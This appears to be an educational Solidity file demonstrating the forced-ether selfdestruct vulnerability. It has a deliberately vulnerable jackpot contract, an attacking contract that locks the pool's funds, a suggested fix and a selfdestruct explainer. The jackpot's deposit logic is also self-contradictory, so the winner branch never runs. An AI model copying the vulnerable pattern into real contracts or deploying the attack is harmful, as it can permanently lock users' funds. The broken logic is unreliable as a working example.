//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/*
A JackPot game contract that sends all funds to the winner when pooled amount reaches 
to the target amount.
Reference: https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834

*/

contract JackPot {

    uint public targetPoolAmount = 4 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "only 1 ether");

        //vulnerability here
        uint balance = address(this).balance;
        require(balance < targetPoolAmount, "pool closed");

        if(balance >= targetPoolAmount) {
            winner = msg.sender;
        }
    }

    function claimPrice() public {
        require(msg.sender == winner, "not the winner");
        winner = address(0);
        (bool success, ) = msg.sender.call{value : address(this).balance}("");
        require(success, "failed to transfer ether");
    }

    //throw error when receiving any ether
    fallback() payable external {
        revert();
    }
}

/*
    selfdestuct is designed for removing a unused/confusion contracts or 
    stop loss when contract is under serious attack.

    below attacking contract uses selfdestuct function to send either
    back to the pool contract without calling any of the functions in
    pool contract. This causes the balance of the pool contract reaches
    to the target amount without a winner. The fund will be locked forever.
*/
contract AttackingContract {
    JackPot pool;

    constructor(JackPot _pool) {
        pool = JackPot(_pool);
    }

    //send some ether to make the pool amount reaches the target pool amount
    function attack() public payable {
        address payable addr = payable(address(pool));
        // ether sent back to `addr` without triggering its fallback/receive function
        selfdestruct(addr);
    }
}

// Solution: Do not use this.balance, use a state variable to calculate the accumulating
// balance. e.g. balance += msg.value


/*
    selfdestruct does two things:

    1.deleting the bytecode at that address
    2.sending all the contract’s funds to a target address
    
    after selfdestruct function is called, it does not throw any error 
    when you interact with any of the contract functions
*/

contract TinyContract {

    address payable private owner;
    uint256 count;

    constructor() {
        owner = payable(msg.sender);
    }

    function reset(uint256 _count) public {
        count = _count;
    }

    function increase() public {
        count += 1;
    }

    function getCount() public view returns(uint256) {
        return count;
    }

    //removes all bytecode from contract and send all ethers back to owner
    function destory() public {
        selfdestruct(owner);
    }
}